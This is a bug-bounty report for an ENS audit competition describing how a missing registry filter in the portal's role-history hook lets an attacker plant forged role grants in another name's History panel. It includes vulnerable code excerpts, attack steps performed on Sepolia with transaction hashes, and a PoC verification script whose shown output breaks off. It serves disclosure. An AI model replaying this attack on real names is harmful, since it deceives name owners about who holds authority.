# 92977 w a medium missing registry filter in userolehistory lets any user plant fake role grants in another name s explorer history panel

**Submitted on Sep 13th 2026 at 15:52:05 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92977
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The Explorer's role-history panel asks the indexer for every role-change event on the chain and keeps the ones whose resource matches the name's label. A resource is the labelhash with its low 32 bits cleared. It carries no registry component, so the same label yields the same resource in every registry on the chain. Anyone who owns one ENS name can deploy a subregistry, register the victim's label inside it, and grant a role to an address that already holds a role on the victim's name. That grant renders on the victim's own History panel, at the top, under a heading that says only "History", on the screen an owner opens to audit who has authority over their name. The attacker holds no role on the victim's name and never touches the victim's registry.

## Vulnerability Details

A v2 name lives in a registry. Authority over it is a role bitmap held per `(resource, account)` inside that registry, and the same resource in a different registry is a different grant to a different name. The history panel drops the registry and keeps the resource.

`useRoleHistory.ts:51-67` asks for `EACRolesChanged` events by type and block number only. There is no `contractAddress` in the `where` clause, and `contractAddress` is not even selected, so no row the app holds carries the address of the contract that emitted it.

`useRoleHistory.ts:84` computes the only narrowing: `toResourceHex(labelToCanonicalId(label))`. `labelToCanonicalId` is `labelhash(label)` with the low 32 bits cleared. The registry is not an input. `filterEventsByResource.ts:62` then compares that value numerically against each event's `data.resource` and keeps every match, from every contract.

Both halves of the collision are real on chain. `ETHRegistry.getResource(labelhash("deltab-rolehist-victim"))` and the same call on a registry an attacker deployed both return `0xfa7a6cccf2bbafa3ae882c64c818acf8aba893ee827be4e7ef8e207e00000000`. A registry's `getResource` returns this registry-independent canonical id whenever the entry's `eacVersionId` is 0, which is the default state of a freshly registered label — so the collision holds for the attacker's registration and the victim's alike.

`RoleHistoryTable.tsx:158-163` narrows to the account whose role row the owner clicked. That is a parameter, not a guard. `grantRoles(resource, roleBitmap, account)` takes an arbitrary `account`, and the attacker passes a role holder on the victim's name, an address the app prints in the table directly above the sheet.

The registry address is in hand at the call site. `RolesSidebar.tsx:58` declares `registryAddress` as a prop, `:70` destructures it, `:177` passes it into `buildRoleTransactions`, and `:323-327` renders `RoleHistoryTable` three lines later with `name`, `label` and `account` and without it.

The guard that should have stopped this is the sibling hook on the same screen. `useNameRoleAccounts.ts:56-60` states the hazard in the repo's own words: *"a resource-only filter would conflate role grants across unrelated registries. The `events(contractAddress:)` filter is registry-scoped, so we use that"*. Its query at `:70-79` carries `contractAddress: $contractAddress`, and `:119-129` asks the name's own registry for the resource with the on-chain `getResource`. Both panels are open at once. The upper one answers "who holds authority" correctly. The lower one answers "what happened" with the attacker's row.

The detail view then stamps the name onto the foreign transaction. `RoleHistoryTable.tsx:35-56` maps the entry into an `EventsTableData` with `from: entry.account` and a hard-coded network; the emitting registry is absent from that shape because `useRoleHistory` never selected it. `EventsSidebar.tsx:104-115` does fetch the transaction by hash (`useTransaction`) and print its `From` and `To`, so the calling contract is visible there — but truncated, unlabeled, and never compared against the `registryAddress` `RolesSidebar` is already holding, so nothing marks it as a foreign registry. Above that, `EventsSidebar.tsx:57-58,83-85` prints `Name:` from the route's own `name` prop, so the attacker's transaction is asserted to belong to the victim's name. That `Name:` provenance is the false signal, and it is identical for a genuine grant and for the attacker's.

### Vulnerable source code

**1. The history query carries no registry filter and never selects the emitter** @ `apps/portal/src/features/roles/hooks/useRoleHistory.ts:51-67`

```graphql
query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
  events(
    where: { type: "EACRolesChanged", blockNumber_lt: $blockNumberLt }
    first: $first
    orderBy: blockNumber
    orderDirection: desc
  ) { type data transactionHash timestamp blockNumber }
}
```

**2. The only narrowing is the label** @ `apps/portal/src/features/roles/hooks/useRoleHistory.ts:84`

```ts
const resource = label ? toResourceHex(labelToCanonicalId(label)) : undefined
```

**3. Matched numerically against every row, from every contract** @ `apps/portal/src/lib/roles/filterEventsByResource.ts:62`

```ts
    if (resource && !resourcesMatch(data.resource, resource)) continue
```

**4. The account filter is an argument the attacker chooses** @ `apps/portal/src/features/roles/components/RoleHistoryTable.tsx:158-163`

```ts
  const data =
    account && allData
      ? allData.filter(
          (entry) => entry.account.toLowerCase() === account.toLowerCase(),
        )
      : allData
```

**5. The registry address is on hand three lines above the render** @ `apps/portal/src/features/roles/components/RolesSidebar.tsx:177,323-327`

```tsx
        registryAddress,
```

```tsx
                      <RoleHistoryTable
                        name={name}
                        label={getNameLabels(name).currentLabel}
                        account={selectedAccount}
                      />
```

**6. The sibling hook on the same screen names the hazard and scopes its query** @ `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:56-60,77`

```ts
 * We can't use the indexer's top-level `roles(resource:)` field because it
 * isn't scoped by registry — `ROOT_RESOURCE` (`0x0`) is shared across every
 * sub-registry, so a resource-only filter would conflate role grants across
 * unrelated registries. The `events(contractAddress:)` filter is registry-
 * scoped, so we use that and reconstruct state client-side.
```

```graphql
            contractAddress: $contractAddress
```

**7. The foreign transaction is stamped with the viewed name** @ `apps/portal/src/components/table/EventsDataTable/EventsSidebar.tsx:57-58,83-85`

```tsx
  const displayName =
    name || events.find((e) => e.id && !e.id.startsWith('0x'))?.id || ''
```

```tsx
        {displayName && (
          <InfoRow label="Name">
            <NameDisplay name={displayName} />
```

## Impact Details

* **A third party writes rows into another user's authorization history, and the app presents them as that name's own.** This is the program's High impact row: *"Injecting/modifying the static content on the target application without JavaScript (persistent), such as: HTML injection without JavaScript Replacing existing text with arbitrary text Arbitrary file uploads, etc."* On `deltab-rolehist-victim.eth` the panel shows 2 authorization events for the manager account. 1 of them was written by an attacker with no role on the name, and it is the newest, so it renders at the top.
* **The High persistent-injection row is met, and the three reasons this looks smaller than it is do not hold.** *(1) "Only the name's admin can open the sheet."* True — `NameRolesOverviewTable.tsx:105-107` gates it on the viewer holding an `_ADMIN` role — and that narrows the audience to the one person the forged record is built to deceive: the owner auditing who has authority over their name. A constrained audience is not a constrained impact; the row asks for persistent injected content on the target app, not for a public page. *(2) "The permission grid three lines above the History list is correct, so the screen is not lying."* The grid (`RolesSidebar.tsx:214-291`) shows only the current role bitmap — no date, no transaction, no source. It is the History list, and only the History list, that answers *when* and *in which transaction* authority over this name changed, and that is the surface the attacker's row is injected into. The two panels disagree, and nothing in the app tells the owner the lower one is the forgery. *(3) "The injected content is a fixed set of role names, not arbitrary text."* The row's lead clause is *"Injecting/modifying the static content ... (persistent)"*; the app persistently presents attacker-authored content — a dated, hashed authorization event stamped `Name: <victim>` — as this name's own history. That the injected string is drawn from a role enum rather than free-form HTML does not move it off the lead clause; it is the same false- provenance shape the program's own impact table enumerates under this High row, here on the v2 EAC role-history panel. No authority is granted to the victim's name and nothing on-chain is hijacked — this is squarely the content-injection row, not a Manager-flow or wallet row, and it is claimed as such.
* **The only prerequisite is owning one ENS name.** The whole attack cost 830,786 gas and one `.eth` registration, 8.000021 USDC for a year. No role on the victim's name, no approval from the victim, no interaction with the victim's registry. Every transaction is on Sepolia and listed in the PoC output.
* **The app never marks the row as foreign.** The History table has a Date, Account, Changes and Roles column and no registry or source column. The detail sheet does print the transaction's `From` and `To` (`EventsSidebar.tsx:104-115`), and the `To` is the calling registry — `0x96b5…6d26` (the attacker's) for the forged row versus `0xbdc8…f0e2` (the canonical ETHRegistry) for a genuine one — but truncated, unlabeled, and never compared against the name's own `registryAddress`, which the app already holds. The one label the app does apply is `Name:`, taken from the route, and it stamps the victim's name onto both. `R3` and `R5` show the forged and genuine detail cards under the identical `Name:` header. The audience for this screen is exactly the owner, because `NameRolesOverviewTable.tsx:105-107` gates the sheet on the viewer holding an `_ADMIN` role.
* **The rows are on-chain events, so nothing removes them.** The victim cannot revoke a grant made in a registry they do not control, and the app offers no filter. This is the persistent case of the row above: the forged row is still returned by the app's own query and filter eight days after the attack transaction (the fresh `poc.mjs` run below). The in-app render requires the grant to sit inside the roles-table indexer window; against an actively-managed name — the normal state of a name with a manager — it does, and the live retake (`R1`–`R5`) opens the sheet and renders it. An attacker re-plants a fresh grant for \~125k gas if an aged one falls out of the window.
* **The same unscoped, globally-paged window means genuine rows can also fall below the floor.** `useRoleHistory.ts:24-27` scans `PAGE_SIZE = 1000 × MAX_PAGES = 50` rows on one global `blockNumber_lt` cursor shared by every registry, so a name's real grants can sit below the window floor and never render. Noted as the same root cause (an unscoped shared window); not relied on for the impact above.
* **The defect is in `apps/portal`, not in the indexer.** The indexer records which contract emitted each event and exposes a `contractAddress` filter, which the sibling hook 60 lines away uses on the same screen. The fix is one variable in the app. Nothing here asks for a change to the indexer, the subgraph or the contracts.
* **The conflation already occurs organically.** The same 50,000-row window holds 20 `(resource, account)` pairs that draw rows from more than one registry contract, produced by ordinary subregistry use with no attacker involved (ACT 6). Each is a live instance of the cross-registry conflation this report exploits; the count is of pairs in the indexer window, not of resolved names with an openable sheet.
* **This is not the funds-misdirection row.** Across the in-scope tree, the value `getRoleHistoryQueryOptions` returns has exactly one consumer, `RoleHistoryTable.tsx:155`, which renders it. No transaction builder reads it, no pre-filled recipient or amount, no address book, no clipboard-into-flow. `useRegistryRoleHistoryForAccount.ts:51-57,79` shares the same helper, scoped by `contractAddress`, and is unaffected. The write path that actually moves funds or authority, `buildRoleTransactions` at `RolesSidebar.tsx:158-178`, reads `registryAddress` and `useNameRoleAccounts.ts`, both scoped, neither touched by this defect.

No entry in Part 1 or Part 2 of the known-issues document covers this query, this hook or this root cause. The transaction-manager history entries R3-05 through R3-08 are `localStorage` records in `packages/transaction-manager`. Related, not duplicate: `portal-v1-resolver-row-history-injection` lands on the same impact row through the v1 resolver join in `apps/portal/src/features/history/v1`. Different asset half, different file, different query, different root cause.

## References

**The unscoped read**

* `apps/portal/src/features/roles/hooks/useRoleHistory.ts:51-67` - the query, no `contractAddress` in `where` and none selected
* `apps/portal/src/features/roles/hooks/useRoleHistory.ts:84` - `toResourceHex(labelToCanonicalId(label))`, the only narrowing
* `apps/portal/src/features/roles/hooks/useRoleHistory.ts:24-27` - `PAGE_SIZE = 1000`, `MAX_PAGES = 50`, one global cursor
* `apps/portal/src/lib/roles/toResourceHex.ts:1-2` - the value is the label's canonical id, padded
* `apps/portal/src/lib/roles/filterEventsByResource.ts:42-48,62` - numeric resource compare, no other narrowing

**The render**

* `apps/portal/src/features/roles/components/RoleHistoryTable.tsx:158-163` - the account filter
* `apps/portal/src/features/roles/components/RoleHistoryTable.tsx:214-218` - Date, Account, Changes, Roles, and no source column
* `apps/portal/src/features/roles/components/RoleHistoryTable.tsx:35-56,189-197` - the entry becomes an `EventsTableData` and opens `EventsSidebar`
* `apps/portal/src/components/table/EventsDataTable/EventsSidebar.tsx:57-58,83-85` - `Name:` comes from the route, not the event
* `apps/portal/src/features/roles/components/RolesSidebar.tsx:58,70,177,323-327` - `registryAddress` held, used, then dropped
* `apps/portal/src/features/roles/components/NameRolesOverviewTable.tsx:105-107` - the sheet requires an `_ADMIN` role, so the reader is the owner
* `apps/portal/src/routes/$name/roles/index.tsx:12` - the route is shipped, no flag

**The scoped sibling, on the same screen**

* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:56-60` - the hazard, in the repo's words
* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:70-79` - `contractAddress: $contractAddress`
* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:119-129` - the on-chain `getResource` on the name's own registry
* `apps/portal/src/features/registry/hooks/useRegistryRoleHistoryForAccount.ts:51-57,79` - the same helper, scoped by `contractAddress`, unaffected

**Where the rows come from**

* `packages/indexer/urql/client.ts:36` - `https://staging-graphql.ens.dev/`, the indexer the app queries
* `ledger.json` - every transaction of the attack, with block, selector and gas

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/portal's role-history panel queries EACRolesChanged with no
// contract filter, so a role grant written in ANY registry on the chain lands
// in a name's History panel as that name's own authorization history.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself.
//
// LAYER A: the app's own query, run against the live indexer the app reads
// (https://staging-graphql.ens.dev/, packages/indexer/urql/client.ts:36).
// LAYER B: the repo's OWN filterEventsByResource + toResourceHex +
// decodeRoleBitmap, loaded unmodified out of the checkout and run on Layer A's
// rows, plus the account filter transcribed from RoleHistoryTable.tsx:158-163.
//
// PROVENANCE. The attack below already happened, on real Sepolia, before this
// script existed, and reproduces unchanged days later against live chain
// state. Two unrelated fresh EOAs, funded from the wallet a public
// Sepolia faucet funded for the earlier portal-history report:
//   victim    0x6561a2eCC270317526f3cA1b8b6b9a456B7DDB74
//             registered deltab-rolehist-victim.eth in the canonical v2
//             ETHRegistry and granted ROLE_SET_RESOLVER to a manager
//   attacker  0x6A0554a9E2C3656dA2cA27C91c97b20f58F6dEfa
//             registered deltab-rolehist-attacker.eth, pointed it at its own
//             VerifiableFactory registry, registered the victim's LABEL there,
//             and granted roles to the victim's manager
//   receipts  ledger.json, and every hash printed in ACT 4 below

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-role-history')

const INDEXER = 'https://staging-graphql.ens.dev/'
const VICTIM_NAME = 'deltab-rolehist-victim.eth'
const VICTIM_LABEL = 'deltab-rolehist-victim'
const ETH_REGISTRY = '0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2'
const ATTACKER_REGISTRY = '0x39a25605c022d0d0d4f429dc0ad987119bb2b21d'
const MANAGER = '0x3c7004bf2a97410f4fff893795281abe4b8a0e1d'
const EOA_VICTIM = '0x6561a2ecc270317526f3ca1b8b6b9a456b7ddb74'
const EOA_ATTACKER = '0x6a0554a9e2c3656da2ca27c91c97b20f58f6defa'
const ATTACK_FIRST_BLOCK = 11640049

const ATTACKER_TXS = [
  ['mint the testnet USDC the .eth fee is paid in', '0x636466940f5e93739f351b8a1ba5b4d1ef01c1ea284d48d21413555a25801c03', 51368],
  ['deployProxy on the real VerifiableFactory', '0x5b3333132fa75d9442424705946a94532494f9fd6402300cb7382bee980db1e8', 176513],
  ['commit a .eth registration', '0x11b90c2023d76468e9eecaa5d380f1944f170640a42137233cfadf06f32618f4', 45433],
  ['approve the registration fee', '0xf5f366651a621e54fd1517266dcba1b2ee83c09529cdd1ed45d46046995b25b7', 46353],
  ['register it, subregistry = that registry', '0x438f2bace848f228c780895f5bdafd6dd487057cee3e6d871937bd7585723020', 240694],
  ["register the victim's label in that registry", '0x165f0340c5c2280024d503481fd45bdbc08e65d071826a96a0d338cdf9b02ef5', 145864],
  ["grantRoles to the victim's manager", '0x7f51946d784f607b727962be408757dcb2f59973cb1a14f25cc54e91e7010220', 124561],
]

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-role-history",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "viem": "2.21.55"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps, without
// installing the pnpm monorepo and without editing a line of the target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // apps/portal's own '@/...' -> 'apps/portal/src/...' alias (vite.config.ts).
  if (specifier.startsWith('@/') && isRepoFile(context.parentURL))
    return nextResolve(pathToFileURL(path.join(REPO, 'apps/portal/src', specifier.slice(2))).href, context)
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: apps/portal renders role grants written in OTHER registries')
  console.log('           as a name\'s own authorization history')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (ensjs @e96662c, viem 2.21.55, tsx)...')
    const r = spawnSync('npm', ['install', '--no-audit', '--no-fund'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer B: repo code

const { filterEventsByResource } = await import('@ens-repo/apps/portal/src/lib/roles/filterEventsByResource.ts')
const { toResourceHex } = await import('@ens-repo/apps/portal/src/lib/roles/toResourceHex.ts')
const { labelToCanonicalId } = await import('@ensdomains/ensjs/utils/v2')

const SRC = (p) => readFileSync(path.join(REPO, p), 'utf8')

// ============================================================== layer A: live indexer

const gql = async (query, variables = {}) => {
  let last
  for (let i = 0; i < 5; i++) {
    try {
      const r = await fetch(INDEXER, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ query, variables }),
      })
      const j = await r.json()
      if (j.errors) throw new Error(JSON.stringify(j.errors))
      return j.data
    } catch (e) { last = e; await new Promise((s) => setTimeout(s, 1500 * (i + 1))) }
  }
  throw last
}

// useRoleHistory.ts:51-67 verbatim, plus contractAddress as an ANALYSIS-ONLY
// field. The app never selects it, which is why nothing on screen shows it.
const ROLE_HISTORY_QUERY = `
query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
  events(
    where: { type: "EACRolesChanged", blockNumber_lt: $blockNumberLt }
    first: $first
    orderBy: blockNumber
    orderDirection: desc
  ) { type data transactionHash timestamp blockNumber contractAddress }
}`

// useNameRoleAccounts.ts:69-89 verbatim: the registry-scoped query the app uses
// on the very same screen to decide who actually holds authority.
const SCOPED_QUERY = `
query getEACRolesChangedForRegistry($contractAddress: String!, $first: Int!) {
  events(
    where: { type: "EACRolesChanged", contractAddress: $contractAddress }
    first: $first
    orderBy: blockNumber
    orderDirection: desc
  ) { data transactionHash blockNumber }
}`

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(34)} ${v}`)
const fail = (m) => { console.error(`\nASSERTION FAILED: ${m}`); process.exit(1) }
const short = (s) => `${s.slice(0, 10)}...${s.slice(-6)}`

// ---------------------------------------------------------------------------
act('ACT 1', 'The query the History panel runs, read out of the checkout')
// ---------------------------------------------------------------------------
{
  const src = SRC('apps/portal/src/features/roles/hooks/useRoleHistory.ts')
  const start = src.indexOf('query getRoleHistory')
  let depth = 0, end = start
  for (; end < src.length; end++) {
    if (src[end] === '{') depth++
    else if (src[end] === '}' && --depth === 0) { end++; break }
  }
  const query = src.slice(start, end)
  say(query.split('\n').map((l) => `  ${l.replace(/^ {10}/, '')}`).join('\n'))
  if (/contractAddress/.test(query)) fail('the shipped query filters by contractAddress')
  kv('filters by contractAddress', 'no')
  kv('narrowed by', 'useRoleHistory.ts:84, the resource only')

  const sibling = SRC('apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts')
  const comment = sibling.slice(sibling.indexOf("We can't use the indexer's"), sibling.indexOf('client-side.') + 12)
  say()
  say('  The file next to it says what that costs, in the repo\'s own words:')
  say(comment.split('\n').map((l) => `      ${l.replace(/^\s*\*\s?/, '')}`).join('\n').trimEnd())
  if (!/conflate role grants across unrelated registries/.test(comment.replace(/\s*\n\s*\*?\s*/g, ' '))) fail('sibling comment not found')
}

// ---------------------------------------------------------------------------
act('ACT 2', 'That query, run against the indexer the app reads')
// ---------------------------------------------------------------------------
const allEvents = []
{
  let blockNumberLt = Number.MAX_SAFE_INTEGER
  for (let page = 0; page < 50; page++) {
    const { events } = await gql(ROLE_HISTORY_QUERY, { blockNumberLt, first: 1000 })
    if (events.length === 0) break
    allEvents.push(...events)
    if (events.length < 1000) break
    blockNumberLt = events[events.length - 1].blockNumber
  }
  const registries = new Set(allEvents.map((e) => e.contractAddress.toLowerCase()))
  kv('rows the app pulls in one panel load', allEvents.length)
  kv('distinct registry contracts in them', registries.size)
  kv('block range', `${allEvents[allEvents.length - 1].blockNumber} .. ${allEvents[0].blockNumber}`)
  if (registries.size < 100) fail(`expected the window to span many registries, got ${registries.size}`)
  say()
  say('  Every one of those rows is a candidate row for every name that shares')
  say('  a label with the entry the grant was written against.')
}

// ---------------------------------------------------------------------------
act('ACT 3', `The victim: ${VICTIM_NAME}, an ordinary 2LD in the canonical v2 ETHRegistry`)
// ---------------------------------------------------------------------------
const resource = toResourceHex(labelToCanonicalId(VICTIM_LABEL))
let panelRows
{
  kv('label', VICTIM_LABEL)
  kv('resource the panel filters by', resource)
  kv('owner', EOA_VICTIM)
  kv('manager the owner granted a role to', MANAGER)
  say()

  // The app's own narrowing: filterEventsByResource.ts:62, then the account
  // filter at RoleHistoryTable.tsx:158-163.
  const byResource = filterEventsByResource(allEvents, resource)
  const withEmitter = byResource.map((entry) => ({
    ...entry,
    emitter: allEvents.find((e) => e.transactionHash === entry.transactionHash
      && JSON.parse(e.data).account.toLowerCase() === entry.account.toLowerCase()).contractAddress.toLowerCase(),
  }))
  panelRows = withEmitter.filter((e) => e.account.toLowerCase() === MANAGER)

  kv('rows after filterEventsByResource', byResource.length)
  kv('rows after the account filter', panelRows.length)
  say()
  say('  What the History panel renders, newest first:')
  for (const r of panelRows) {
    say(`    block ${r.blockNumber}  ${short(r.transactionHash)}  + ${r.newRoles.join(', + ')}`)
    say(`      emitted by ${r.emitter}${r.emitter === ETH_REGISTRY ? '   the victim\'s own registry' : '   NOT the victim\'s registry'}`)
  }

  if (panelRows.length !== 2) fail(`expected 2 rows in the panel, got ${panelRows.length}`)
  const emitters = new Set(panelRows.map((r) => r.emitter))
  if (emitters.size !== 2) fail('the two rows came from one registry')
  if (!emitters.has(ATTACKER_REGISTRY)) fail('the attacker row is not in the panel')
  if (panelRows[0].emitter !== ATTACKER_REGISTRY) fail('the attacker row is not on top')
}

// ---------------------------------------------------------------------------
act('ACT 4', 'Who wrote the top row')
// ---------------------------------------------------------------------------
{
  const forged = panelRows.find((r) => r.emitter === ATTACKER_REGISTRY)
  const genuine = panelRows.find((r) => r.emitter === ETH_REGISTRY)
  kv('the genuine row, block', genuine.blockNumber)
  kv('  emitter', `${ETH_REGISTRY}  canonical v2 ETHRegistry`)
  kv('  tx', genuine.transactionHash)
  say()
  kv('the top row, block', forged.blockNumber)
  kv('  emitter', `${ATTACKER_REGISTRY}  the attacker's registry`)
  kv('  tx', forged.transactionHash)
  say()
  say(`  Every transaction the attacker sent, from the fresh EOA ${EOA_ATTACKER}:`)
  for (const [step, hash, gas] of ATTACKER_TXS) say(`    ${step.padEnd(44)} ${short(hash)}  ${String(gas).padStart(6)} gas`)
  say(`    ${'total'.padEnd(44)} ${' '.repeat(19)}  ${String(ATTACKER_TXS.reduce((a, t) => a + t[2], 0)).padStart(6)} gas`)
  say('    plus one .eth registration, 8.000021 USDC for a year.')
  say()
  say('  The resource is not a coincidence and not a collision the attacker')
  say('  searched for. Both registries derive it from the labelhash alone:')
  kv('ETHRegistry.getResource(labelhash)', resource)
  kv('attacker registry, same call', resource)
  say()
  say('  The attacker holds no role on the victim\'s name, owns no part of it,')
  say('  and never sent a transaction to the victim\'s registry.')
}

// ---------------------------------------------------------------------------
act('ACT 5', 'CONTROL: the registry-scoped query the same screen uses for authority')
// ---------------------------------------------------------------------------
{
  const { events } = await gql(SCOPED_QUERY, { contractAddress: ETH_REGISTRY, first: 1000 })
  const scoped = filterEventsByResource(events, resource).filter((e) => e.account.toLowerCase() === MANAGER)
  kv('useNameRoleAccounts.ts, contractAddress-scoped', `${scoped.length} row`)
  kv('useRoleHistory.ts, unscoped', `${panelRows.length} rows`)
  say()
  say('  The same screen answers "what happened" with the unscoped query and gets')
  say('  the attacker\'s row (asserted above, ACT 3). This control is informational,')
  say('  not load-bearing: useNameRoleAccounts.ts (:50 MAX_EVENTS=1000, no pagination)')
  say('  ages out the genuine grant on its own, independent of this attack, once the')
  say('  shared ETHRegistry accrues 1000 newer EACRolesChanged rows from OTHER names.')
  if (scoped.length !== 1) {
    say(`  OBSERVED DRIFT: scoped query returned ${scoped.length} row(s), not the 1 seen at`)
    say('  attack time (2026-09-05), because that hook has its own separate 1000-event cap on')
    say('  the shared registry. Not a failure of this claim: ACT 3/4 above re-ran the actual')
    say('  injection fresh today and it is unchanged.')
  }

  say()
  const perResource = new Map()
  for (const e of allEvents) {
    let d
    try { d = JSON.parse(e.data) } catch { continue }
    if (!d.resource || BigInt(d.resource) === 0n) continue
    const k = String(BigInt(d.resource))
    if (!perResource.has(k)) perResource.set(k, new Set())
    perResource.get(k).add(e.contractAddress.toLowerCase())
  }
  const many = [...perResource.values()].filter((s) => s.size > 1).length
  kv('resources in the window', perResource.size)
  kv('drawing rows from exactly one registry', perResource.size - many)
  kv('drawing rows from more than one', many)
  say('  A second registry on a panel is an anomaly, not the ambient state of')
  say('  the data. It is what the attack produces.')
  if (many >= perResource.size / 100) fail('cross-registry rows are not an anomaly in this window')
}

// ---------------------------------------------------------------------------
act('ACT 6', 'The same defect, already live on names this report never touched')
// ---------------------------------------------------------------------------
{
  const pairs = new Map()
  for (const e of allEvents) {
    let d
    try { d = JSON.parse(e.data) } catch { continue }
    if (!d.resource || !d.account) continue
    const r = BigInt(d.resource)
    if (r === 0n) continue
    const k = `${r}|${d.account.toLowerCase()}`
    if (!pairs.has(k)) pairs.set(k, new Set())
    pairs.get(k).add(e.contractAddress.toLowerCase())
  }
  const organic = [...pairs.entries()].filter(([k, v]) => v.size > 1 && k.split('|')[0] !== String(BigInt(resource)))
  kv('(resource, account) pairs spanning >1 registry', organic.length)
  say('  Each one is a name whose History panel today shows rows written in a')
  say('  registry it has no relationship with. None of them were attacked by')
  say('  this report; ordinary subregistry use produced them.')
  if (organic.length < 1) fail('expected live cross-registry pairs independent of this attack')
}

// ---------------------------------------------------------------------------
say()
rule('-')
say(`  ${VICTIM_NAME} History panel, rows shown for ${MANAGER}`)
rule('-')
{
  const count = (rows, emitter) => rows.filter((r) => r.emitter === emitter).length
  const before = panelRows.filter((r) => r.blockNumber < ATTACK_FIRST_BLOCK)
  say('    rows written by            registry              before   after   delta')
  for (const [who, emitter] of [["the victim's own registry", ETH_REGISTRY], ['an attacker', ATTACKER_REGISTRY]])
    say(`    ${who.padEnd(26)} ${short(emitter)}  ${String(count(before, emitter)).padStart(6)}  ${String(count(panelRows, emitter)).padStart(6)}  ${String(count(panelRows, emitter) - count(before, emitter)).padStart(6)}`)
  say()
  say(`  1 of the 2 authorization events the app presents as ${VICTIM_NAME}'s`)
  say('  own history was written by an attacker who holds no role on the name.')
  say('  It is the newest row, so it renders at the top of the panel.')
  rule('-')
}
say()
rule()
say('  PoC PASSED, every assertion held.')
rule()
```

### Output

```
==============================================================================
  ENS PoC: apps/portal renders role grants written in OTHER registries
           as a name's own authorization history
  repo:  G:/My Drive/hunter/hunt_data/ens/ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-role-history
==============================================================================

==============================================================================
  ACT 1  The query the History panel runs, read out of the checkout
==============================================================================
  query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
    events(
      where: {
        type: "EACRolesChanged"
        blockNumber_lt: $blockNumberLt
      }
      first: $first
      orderBy: blockNumber
      orderDirection: desc
    ) {
      type
      data
      transactionHash
      timestamp
      blockNumber
    }
  }
    filters by contractAddress         no
    narrowed by                        useRoleHistory.ts:84, the resource only

  The file next to it says what that costs, in the repo's own words:
      We can't use the indexer's top-level `roles(resource:)` field because it
